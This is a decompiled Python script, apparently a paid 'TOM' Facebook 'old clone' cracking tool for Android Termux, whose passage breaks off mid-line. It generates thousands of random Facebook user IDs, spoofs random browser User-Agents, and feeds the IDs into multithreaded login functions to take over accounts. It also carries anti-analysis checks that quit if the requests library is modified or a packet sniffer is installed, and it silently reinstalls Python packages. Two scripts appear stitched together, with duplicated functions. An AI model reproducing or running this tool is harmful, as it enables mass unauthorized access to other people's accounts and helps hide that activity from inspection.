# -*- coding: utf-8 -*-
# Decompiled from Python 3.12 bytecode
import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import shutil
import time

# Your WhatsApp group link
channel_link = "https://chat.whatsapp.com/DrL83B3J99yL4YNgBaGJ3q"

# Valid keys (cleaned - no trailing space)
approved_keys = [
    "BRAN"
]

# ANSI color codes
GREEN = "\033[1;32m"
RESET = "\033[0m"

# Optional: max attempts and cooldown
MAX_ATTEMPTS = 3
COOLDOWN_SECONDS = 8

def clear_screen():
    os.system("clear")

def open_link(url):
    # prefer termux-open-url, fallback to xdg-open, then Android intent
    if shutil.which("termux-open-url"):
        subprocess.run(["termux-open-url", url], check=False)
    elif shutil.which("xdg-open"):
        subprocess.run(["xdg-open", url], check=False)
    else:
        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", url], check=False)

def normalize(s):
    """
    Normalize string for comparison:
    - strip leading/trailing whitespace
    - collapse multiple internal spaces to single
    - lower-case for case-insensitive compare
    """
    if s is None:
        return ""
    return " ".join(s.split()).lower()

# Prepare a set of normalized approved keys for fast compare
approved_normalized = { normalize(k) for k in approved_keys }

def first_step():
    clear_screen()
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"        {GREEN}🔒 Script Locked TOM 🔒{RESET}")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
    print(f"{GREEN} THIS TOOL IS PAID ✅ {RESET}\n")
    print("Please open the admin/channel on WhatsApp first and then get the key.\n")
    print(f"Channel link: https://chat.whatsapp.com/LdFO1RSmbJa9OcxTReL7MU")

    if not (channel_link.startswith("http://") or channel_link.startswith("https://")):
        print("Invalid link format — URL must start with http/https.")
    else:
        try:
            open_link(channel_link)
            print("Tried to open the channel. If WhatsApp doesn't open automatically, check manually.")
        except Exception as e:
            print(f"Error while opening link: {e}")

    input("\nPress Enter when you're ready...")

def check_key():
    attempts = 0
    while attempts < MAX_ATTEMPTS:
        # VISIBLE input now (not hidden)
        user_key = input("\nEnter your key (visible): ")
        user_norm = normalize(user_key)
        if user_norm in approved_normalized:
            print(f"\n{GREEN}Key approved! Script is running...{RESET}\n")
            return True
        else:
            attempts += 1
            remaining = MAX_ATTEMPTS - attempts
            print(f"\n{GREEN}Invalid key! Attempts left: {remaining}{RESET}")
    # cooldown then exit
    print(f"\n[!] Too many wrong attempts. Wait {COOLDOWN_SECONDS} seconds.")
    time.sleep(COOLDOWN_SECONDS)
    sys.exit(1)

if __name__ == "__main__":
    first_step()
    check_key()
    # ---------- main tool starts here ----------
    print(">>> Tool Successfully Unlocked <<<")
    # place your main code below



# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()


# Initial setup and promotion
os.system('clear')
print(' \x1b[38;5;46mTOMX SERVER LOADING....')
os.system('xdg-open ')
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx pip install beautifulsoup4')
os.system('xdg-open ')
print('loading Modules ...\n')
os.system('clear')
print(' speak\x1b[38;5;46mTOM X SERVER SUCCESSFUL LOGIN....')
os.system('https://chat.whatsapp.com/LdFO1RSmbJa9OcxTReL7MU')


# --- Anti-tampering and Security Checks ---
# The script checks if the source code of the 'requests' library has been modified
# or if packet sniffing tools are being used.
try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass


class sec:
    """
    A security class to detect debugging and packet sniffing tools.
    """
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        # Paths to check for modifications
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        # Check for HTTPCanary (a packet sniffing app)
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        """
        Terminates the script if tampering is detected.
        """
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
            print("\033[38;5;15m================================================")


# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

# Color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'


def windows():
    """
    Generates a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])


def window1():
    """
    Generates another variant of a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])


# Set window title
sys.stdout.write('\x1b]2;𓆩【TOM X 404】𓆪 \x07')


def ____banner____():
    """
    Displays the main banner and tool information.
    """
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
        # TOM Clover Logo - Green - Version 3.4
def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
        
    
    # Top border
    print("\033[1;31m" + "─" * 65 + "\033[0m")
    
    # ASCII Logo
    tom_logo = r"""
     ████████╗  ██████╗  ███╗   ███╗
     ╚══██╔══╝ ██╔═══██╗ ████╗ ████║
        ██║    ██║   ██║ ██╔████╔██║
        ██║    ██║   ██║ ██║╚██╔╝██║
        ██║    ╚██████╔╝ ██║ ╚═╝ ██║
        ╚═╝     ╚═════╝  ╚═╝     ╚═╝
"""
    print("\033[1;32m" + tom_logo + "\033[0m")
    
    # Footer Banne
    print("\033[38;5;15m================================================")
    print("\033[1;33m[+]\033[1;35m AUTHOR  : TOM")
    print("\033[1;33m[+]\033[1;35m VERSION : OLD CRACK 🖤🔥")
    print("\033[1;33m[+]\033[1;35m VERSION : 1.0")
    print("\033[38;5;15m================================================")
    print("\033[38;5;15m------------------------------------------------")

# Call the banner function
____banner____()
def creationyear(uid):
    """
    Estimates the Facebook account creation year based on the UID.
    """
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''


def clear():
    os.system('clear')

#-----------------------------[APPROVAL CHECK]-----------------------------------#
# 🔐 Key Generation
import os, subprocess, requests, urllib.parse

# Key Generation
a = str(os.geteuid())
b = str(os.geteuid())
try:
    build = subprocess.check_output('getprop ro.build.id', shell=True).decode('utf-8').replace('\n','')
except:
    build = "UNKNOWN"

x = (a + build + b).upper().replace(".", "")
z = "X".join(x)
keys = z[15:]
final_key = "TOM-" + keys

# Online Approval Check
def approval_check_online():
    try:
        link = "https://raw.githubusercontent.com/WORKING-110/tom-cloning-termax-tool/refs/heads/main/Approval"

        # ⭐ PREMIUM BANNER
        print("\033[1;35m")
        print("╔══════════════════════════════════════════════════════╗")
        print("║                 \033[1;32m🔥 TOM PAID TOOL 🔥\033[1;35m                    ║")
        print("║          \033[1;36mPremium • Fast • Secure • Professional\033[1;35m        ║")
        print("╚══════════════════════════════════════════════════════╝\033[0m\n")

        # 🌈 MULTI-COLOUR LOGO
        logo = [
    ("─────────────────────────────", "\033[1;90m"),  # grey separator line
    ("OWNER NAME : \033[1;93mTOM", "\033[1;97m"),       # white label + yellow name
    ("OWNER NUMBER : \033[1;92m+923701729896", "\033[1;97m"),  # white label + green number
    ("─────────────────────────────", "\033[1;90m"),  # grey separator line
]
        # 💵 Prices Section
        print("      \033[1;36m[\033[97;1m•\033[1;36m] \033[97;1mSend Key TOM X.")
        print("      \033[1;36m[\033[97;1m•\033[1;36m] \033[97;1m07 Days Apprval 350rs")
        print("      \033[1;36m[\033[97;1m•\033[1;36m] \033[97;1m15 Days Apprval 550rs")
        print("      \033[1;36m[\033[97;1m•\033[1;36m] \033[97;1m30 Days Apprval 950rs")

        # 🔹 User chooses price first
        choice = input("Select your pricing option (1/2/3): ").strip()
        while choice not in ['1','2','3']:
            choice = input("Invalid option! Please choose 1, 2, or 3: ").strip()

        # After selection, show selected price
        prices = {'1': '350 rs', '2': '550rs', '3': '950rs'}
        selected_price = prices[choice]
        print(f"\n\033[1;36mYou selected: {selected_price}\033[0m\n")

        # KEY SHOW AFTER CHOICE
        print(f"\033[1;33m🔑 Your Device Key:\033[0m \033[1;32m{final_key}\033[0m\n")

        # Approval check
        response = requests.get(link)
        if response.status_code == 200:
            approved_keys = response.text.splitlines()
            if final_key in approved_keys:
                print("\033[1;32m✅ Approval Successful! Welcome 😎\033[0m")
            else:
                print("\033[1;31m❌ Your key is not approved.\033[0m")
                print("📞 Contact Admin via WhatsApp")
                input("Press Enter to open WhatsApp chat with your key...")

                # WhatsApp Auto Chat for Termux
                wa_number = "923701729896"  # Admin WhatsApp
                wa_message = urllib.parse.quote(final_key)
                wa_link = f"https://wa.me/{wa_number}?text={wa_message}"
                os.system(f"termux-open-url '{wa_link}'")  # Termux-friendly
                exit()
        else:
            print("❌ Failed to fetch key list. Status:", response.status_code)
            exit()

    except Exception as e:
        print(f"❌ Error during approval check: {str(e)}")
        exit()

approval_check_online()
def linex():
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def BNG_71_():
    """
    Main menu function.
    """
    ____banner____()
    print('\x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOLD CLONE')
    linex()
    __Jihad__ = input(f"\x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE  {W}: {Y}")
    if __Jihad__ in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()


def old_clone():
    """
    Menu for selecting old account cloning type.
    """
    ____banner____()
    print('\x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mALL SERIES')
    linex()
    print('\x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m100003/4 SERIES')
    linex()
    print('\x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m2009 series')
    linex()
    _input = input(f"\x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE  {W}: {Y}")
    if _input in ('A', 'a', '01', '1'):
        old_One()
    elif _input in ('B', 'b', '02', '2'):
        old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        old_Tree()
    else:
        print(f"\n[×]{rad} Choose Value Option... ")
        BNG_71_()


def old_One():
    """
    Cloning method for accounts from 2010-2014.
    """
    user = []
    ____banner____()
    print(f"\x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOld Code {Y}:{G} 2010-2014")
    ask = input(f"\x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"\x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"\x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"\x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"\x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def old_Tow():
    """
    Cloning method for accounts with specific prefixes.
    """
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOLD CODE {Y}:{G} 2012-2014")
    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = random.choice(['123456', '1234567', '12345678', '123456789', '1234567890', '0987654321', '112233', '786786', '654321'])
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38